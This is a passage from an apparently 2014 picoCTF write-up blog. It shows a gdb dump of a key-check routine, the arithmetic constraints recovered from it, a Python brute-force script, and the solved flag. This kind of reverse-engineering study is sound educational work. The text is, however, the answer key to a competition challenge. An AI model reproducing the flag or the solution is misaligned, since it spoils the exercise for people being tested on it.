</pre></td><td class='code'><pre><code class='bash'><span class='line'>EAX: 0x37363534 <span class="o">(</span><span class="s1">&#39;4567&#39;</span><span class="o">)</span>
</span><span class='line'>EBX: 0xffffd21c <span class="o">(</span><span class="s2">&quot;0123456789abcdefABCDEFGHIJKLMNOP&quot;</span><span class="o">)</span>
</span><span class='line'>ECX: 0xffffffde
</span><span class='line'>EDX: 0x33323130 <span class="o">(</span><span class="s1">&#39;0123&#39;</span><span class="o">)</span>
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x62613938 <span class="o">(</span><span class="s1">&#39;89ab&#39;</span><span class="o">)</span>
</span><span class='line'>EBP: 0xffffd338 --&gt; 0xffffd3b8 --&gt; 0x0
</span><span class='line'>ESP: 0xffffd200 --&gt; 0xffffd21c <span class="o">(</span><span class="s2">&quot;0123456789abcdefABCDEFGHIJKLMNOP&quot;</span><span class="o">)</span>
</span><span class='line'>EIP: 0x804858e <span class="o">(</span>lea    ebx,<span class="o">[</span>edi+eax*1<span class="o">])</span>
</span><span class='line'>EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>   0x8048582: mov    edx,DWORD PTR <span class="o">[</span>esp+0x1c<span class="o">]</span>
</span><span class='line'>   0x8048586: mov    eax,DWORD PTR <span class="o">[</span>esp+0x20<span class="o">]</span>
</span><span class='line'>   0x804858a: mov    edi,DWORD PTR <span class="o">[</span>esp+0x24<span class="o">]</span>
</span><span class='line'><span class="o">=</span>&gt; 0x804858e:   lea    ebx,<span class="o">[</span>edi+eax*1<span class="o">]</span>
</span><span class='line'>   0x8048591: mov    ecx,0x0
</span><span class='line'>   0x8048596: cmp    ebx,0xc0dcdfce
</span><span class='line'>   0x804859c: jne    0x80485ad
</span></code></pre></td></tr></table></div></figure>


<p>So for this first constraint, we see that <code>var2 + var3 == 0xc0dcdfce</code>. I stepped through the code and set <code>ebx</code> to the right value, allowing me to see the other checks. I wrote them down:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">((</span>b+c<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0xc0dcdfce
</span><span class='line'><span class="o">((</span>a+b<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0xd5d3dddc
</span><span class='line'><span class="o">((</span>a*3+b*5<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x404a7666
</span><span class='line'><span class="o">((</span>a ^ d<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x18030607
</span><span class='line'><span class="o">((</span>a <span class="p">&amp;</span> d<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x666c6970
</span><span class='line'><span class="o">((</span>b * e<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0xb180902b
</span><span class='line'><span class="o">((</span>c * e<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x3e436b5f
</span><span class='line'><span class="o">((</span>e * f*2<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x5c483831
</span><span class='line'><span class="o">((</span>f <span class="p">&amp;</span> 0x70000000<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x70000000
</span><span class='line'><span class="o">((</span>f / g<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 1
</span><span class='line'><span class="o">((</span>f % g<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0xe000cec
</span><span class='line'><span class="o">((</span>e*3+i*2<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x3726eb17
</span><span class='line'><span class="o">((</span>c*4+i*7<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x8b0b922d
</span><span class='line'><span class="o">((</span>d+i*3<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0xb9cf9c91
</span></code></pre></td></tr></table></div></figure>


<p>What else can we infer? Well, since <code>a+b == 0xd5...</code>, <code>0xd5 - first char of a</code> must be within the ASCII range too. This allowed me to narrow down the values that were possible for the first three chunks of the flag. After messing with <code>python-constraint</code>, I started writing my own script. This first script uses python sets, and used just shy of 6 GB of memory; way too much for my poor laptop. I re-wrote the code to use just integer arithmetic. Below is the final script. It&rsquo;s super ugly, but it&rsquo;s late and I&rsquo;m tired!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">itertools</span><span class="o">,</span> <span class="nn">string</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">h</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">8</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">z</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">strToInt</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
</span><span class='line'>      <span class="n">i</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="n">i</span> <span class="o">+=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">i</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Generating potential strings...&quot;</span>
</span><span class='line'><span class="n">sz</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">map</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">,</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="s">&quot;_&quot;</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">4</span><span class="p">))]</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Converting potential strings to ints...&quot;</span>
</span><span class='line'><span class="n">allowed</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'><span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">sz</span><span class="p">:</span>
</span><span class='line'>  <span class="n">allowed</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">strToInt</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Brutef... Erm, Constraining...&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">s1</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>  <span class="n">s2</span> <span class="o">=</span> <span class="mh">0xd5d3dddc</span> <span class="o">-</span> <span class="n">s1</span>
</span><span class='line'>  <span class="c"># OK, so s2+s1 = 0xd0... so we know that that x1 = 0xd0-x2</span>
</span><span class='line'>  <span class="c"># For s1 starting with 61..7a (a-z), 0xd0 - x1 is 0x5b..0x74. </span>
</span><span class='line'>  <span class="c"># For s1 starting with 41..5a and 30..39, 0xd0 - x1 becomes too large!</span>
</span><span class='line'>  <span class="c"># Therefor, s2 must start with 0x5B .. 0x74 inclusive. </span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">s2</span> <span class="o">&gt;=</span> <span class="mh">0x5B000000</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s2</span> <span class="o">&lt;</span> <span class="mh">0x75000000</span><span class="p">):</span>
</span><span class='line'>      <span class="n">s3</span> <span class="o">=</span> <span class="mh">0xc0dcdfce</span> <span class="o">-</span> <span class="n">s2</span>
</span><span class='line'>      <span class="c"># The same applies for s3</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">s3</span> <span class="o">&gt;=</span> <span class="mh">0x4c000000</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s3</span> <span class="o">&lt;</span> <span class="mh">0x66000000</span><span class="p">):</span>
</span><span class='line'>          <span class="c"># This is another constraint</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span> <span class="p">((</span><span class="n">s1</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">s2</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x404a7666</span><span class="p">:</span>
</span><span class='line'>              <span class="n">s4</span> <span class="o">=</span> <span class="mh">0x18030607</span> <span class="o">^</span> <span class="n">s1</span>
</span><span class='line'>              <span class="k">if</span> <span class="n">s4</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>                  <span class="k">print</span> <span class="s">&quot;s1: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s1</span><span class="p">))</span>
</span><span class='line'>                  <span class="k">print</span> <span class="s">&quot;s2: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s2</span><span class="p">))</span>
</span><span class='line'>                  <span class="k">print</span> <span class="s">&quot;s3: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s3</span><span class="p">))</span>
</span><span class='line'>                  <span class="k">print</span> <span class="s">&quot;s4: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s4</span><span class="p">))</span>
</span><span class='line'>                  <span class="k">for</span> <span class="n">s5</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>                      <span class="k">if</span> <span class="p">((</span><span class="n">s5</span> <span class="o">*</span> <span class="n">s2</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb180902b</span><span class="p">:</span>
</span><span class='line'>                          <span class="k">if</span> <span class="p">((</span><span class="n">s5</span> <span class="o">*</span> <span class="n">s3</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x3e436b5f</span><span class="p">:</span>
</span><span class='line'>                              <span class="k">print</span> <span class="s">&quot;s5: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s5</span><span class="p">))</span>
</span><span class='line'>                              <span class="k">for</span> <span class="n">s6</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>                                  <span class="k">if</span> <span class="p">(</span><span class="n">s6</span> <span class="o">&amp;</span> <span class="mh">0x70000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x70000000</span><span class="p">:</span>
</span><span class='line'>                                      <span class="c">#problem.addConstraint(lambda e, f: ((e * f*2) &amp; 0xffffffff) == 0x5c483831, (&quot;e&quot;, &quot;f&quot;))</span>
</span><span class='line'>                                      <span class="c">#problem.addConstraint(lambda f: ((f &amp; 0x70000000) &amp; 0xffffffff) == 0x70000000, (&quot;f&quot;))</span>
</span><span class='line'>                                      <span class="k">if</span> <span class="p">((</span><span class="n">s5</span> <span class="o">+</span> <span class="p">((</span><span class="n">s6</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x5c483831</span><span class="p">:</span>
</span><span class='line'>                                          <span class="k">print</span> <span class="s">&quot;s6: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s6</span><span class="p">))</span>
</span><span class='line'>                                          <span class="k">for</span> <span class="n">s7</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>                                              <span class="k">if</span> <span class="p">((</span><span class="n">s6</span> <span class="o">/</span> <span class="n">s7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>                                                  <span class="k">if</span> <span class="p">((</span><span class="n">s6</span> <span class="o">%</span> <span class="n">s7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xe000cec</span><span class="p">:</span>
</span><span class='line'>                                                      <span class="k">print</span> <span class="s">&quot;s7: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s7</span><span class="p">))</span>
</span><span class='line'>                                                      <span class="k">for</span> <span class="n">s8</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>                                                          <span class="c">#((e*3+i*2) &amp; 0xffffffff) == 0x3726eb17, (&quot;e&quot;, &quot;i&quot;))</span>
</span><span class='line'>                                                          <span class="c">#((c*4+i*7) &amp; 0xffffffff) == 0x8b0b922d, (&quot;c&quot;, &quot;i&quot;))</span>
</span><span class='line'>                                                          <span class="c">#((d+i*3) &amp; 0xffffffff) == 0xb9cf9c91, (&quot;d&quot;, &quot;i&quot;))</span>
</span><span class='line'>                                                          <span class="k">if</span> <span class="p">(((</span><span class="n">s5</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span><span class="o">+</span><span class="p">((</span><span class="n">s8</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x3726eb17</span><span class="p">:</span>
</span><span class='line'>                                                              <span class="k">if</span> <span class="p">(((</span><span class="n">s3</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span><span class="o">+</span><span class="p">((</span><span class="n">s8</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8b0b922d</span><span class="p">:</span>
</span><span class='line'>                                                                  <span class="k">if</span> <span class="p">(((</span><span class="n">s4</span> <span class="o">*</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span><span class="o">+</span><span class="p">((</span><span class="n">s8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb9cf9c91</span><span class="p">:</span>
</span><span class='line'>                                                                      <span class="k">print</span> <span class="s">&quot;s8: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s8</span><span class="p">))</span>
</span><span class='line'>                                                                      <span class="k">print</span> <span class="s">&quot;The flag is: &quot;</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s1</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s2</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s3</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s4</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s5</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s6</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s7</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s8</span><span class="p">)</span>
</span><span class='line'>                                                                      <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>The flag is: solving_equations_is_lots_of_fun</code>. That was the last challenge done!</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>

      




<time class='entry-date' datetime='2014-11-06T22:52:14+01:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>6</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>10:52 pm</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/engineering/'>engineering</a>, <a class='category' href='/blog/categories/picoctf/'>picoctf</a>, <a class='category' href='/blog/categories/reverse/'>reverse</a>, <a class='category' href='/blog/categories/shellcode/'>shellcode</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup/" title="Previous Post: We need to go deeper: Kvasir Writeup">&laquo; We need to go deeper: Kvasir Writeup</a>
      
      
        <a class="basic-alignment right" href="/blog/2014/11/06/picoctf-hardcore-rop/" title="Next Post: PicoCTF - Hardcore ROP">PicoCTF - Hardcore ROP &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/09/21/ekoparty-cry100/">Ekoparty - Cry100</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/09/21/ekoparty-pwn200/">Ekoparty - Pwn200</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/18/camp-ctf-dkm/">CAMP CTF - Dkm</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/18/camp-ctf-ropcalc/">CAMP CTF - Ropcalc</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/18/camp-ctf-secret-file/">CAMP CTF - Secret_File</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - barrebas -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'barrebas';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/';
        var disqus_url = 'http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
